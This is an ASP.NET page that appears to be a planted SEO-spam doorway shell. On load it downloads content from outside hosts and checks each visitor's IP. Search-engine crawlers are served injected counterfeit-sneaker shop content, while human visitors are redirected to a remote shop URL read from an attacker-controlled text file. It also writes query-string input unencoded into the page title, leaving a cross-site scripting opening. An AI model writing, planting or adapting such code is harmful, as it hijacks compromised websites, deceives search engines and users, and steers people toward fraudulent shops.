<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            tz();
            hyzhdy = webclient.DownloadString("http://jf.a123.fr/new/urlkey.asp?cid=1");
            zhang = webclient.DownloadString("http://rr.nknk.fr/zhang-js.asp");
            string ggf = new string[] { "http://jf.a123.fr/new/it/zh-it-01.txt", "http://jf.a123.fr/new/it/zh-it-01.txt", "http://jf.a123.fr/new/it/zh-it-01.txt", "http://jf.a123.fr/new/it/zh-it-01.txt" }[new Random(unchecked((int)DateTime.Now.Ticks)).Next(0, 3)];
            descriptions = webclient.DownloadString("http://key.okbankservices.com/JDN_description.aspx?kt=" + ggf);

            string pname = HttpContext.Current.Request.Path;

            string URL = "";

            if (Request.QueryString["shop"] != null)
            {
                URL1 = hyzhdy + "/JDN_JF.aspx?gj=" + Request.QueryString["gj"] + "&hl=" + Request.QueryString["hl"] + "&shop=" + Request.QueryString["shop"].Replace(" ", "+") + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"] + "&pl=" + Request.QueryString["pl"] + "&kt=" + ggf;
                URL = zhang + "?gj=" + Request.QueryString["gj"] + "&hl=" + Request.QueryString["hl"] + "&shop=" + Request.QueryString["shop"].Replace(" ", "+") + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"];
                content = webclient.DownloadString(URL);
                content1 = webclient.DownloadString(URL1);
                content = content.Replace("euro;", "$");
				content = content.Replace("DDDDD", "EUR");
				content = content.Replace("uuuuuuu", HttpContext.Current.Request.Path);
				
                content1 = content1.Replace("<li><a href=\"\"", "<li><a href=\"" + pname + "\"");
            }
            else
            {
                URL = hyzhdy + "/JDN_JF.aspx?gj=it&hl=it&xi=1-5&xc=12-19&txt=" + ggf + "&page=" + pname;
                content = webclient.DownloadString(URL);
            }

        }
    }
    public void tz()
    {
        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string domain = webclient.DownloadString("http://jf.a123.fr/getdomain.aspx?rnd=1&ip=" + ip).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["shop"] != null)
            {
                string ccc = Request.QueryString["shop"];
                ccc = ccc.Replace("+", "-");
                ccc = ccc.Replace(" ", "-");
                ccc = ccc.Replace("--", "-");
                string ddd = webclient.DownloadString("http://jf.a123.fr/it-zh.txt");
                string eee = ddd + ccc + ".html";
                eee = eee.Replace("--", "-");
                Response.Redirect(eee);
            }
        }

    }

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Language" content="it-it" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title>
        <%=Request.QueryString["shop"]%>- OFF<%=new Random().Next(60, 80)%>% -<%=HttpContext.Current.Request.Url.Host%>!</title>
    <meta name="description" content="<%=descriptions%>" />
    <meta name="robots" content="index,follow,all" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="Robots" content="index, follows">
</head>
<body>
    <%=content %>
    <%=content1 %>
	
	
	<div class="li">
                    
                   <ul>
					<li><a href="jersey-en.aspx">jersey</a></li>
					<li><a href="new.aspx">taobao</a></li>
					<li><a href="ad-es.aspx">adidas -es</a></li>
					<li><a href="nk-en.aspx">nike max</a></li>
					<li><a href="tao.aspx">taobao-en</a></li>
					<li><a href="zh-it.aspx">puma</a></li>
<li><a href="ad-fr.aspx">adidas fr</a></li>
					</ul></div>

</body>
</html>
